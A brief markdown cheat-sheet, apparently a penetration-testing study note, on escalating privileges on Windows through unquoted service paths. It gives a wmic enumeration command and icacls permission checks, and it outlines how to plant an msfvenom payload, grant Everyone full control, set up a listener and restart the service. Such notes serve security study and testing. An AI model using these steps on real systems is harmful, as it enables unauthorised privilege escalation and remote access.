# Example:

## Manual Enumeration: cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

### C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

#### If this is unquoted, cmd will search for programs to execute like:

### C:\MyPrograms\Disk.exe

### C:\MyPrograms\Disk Sorter.exe

#### 1: Check permissions on directories with icacls.

#### If BUILTIN/Users has (AI) and (WD), a user is allowed to create subdirectories and files respectively.

#### 2: msfvenom payload

#### 3: Rename payload to one of the arguments then grant it (F) permissions with icacls

#### icacls "c:\path\to\service.exe" /grant Everyone:F

#### 4: Setup listener

#### 5: Restart service
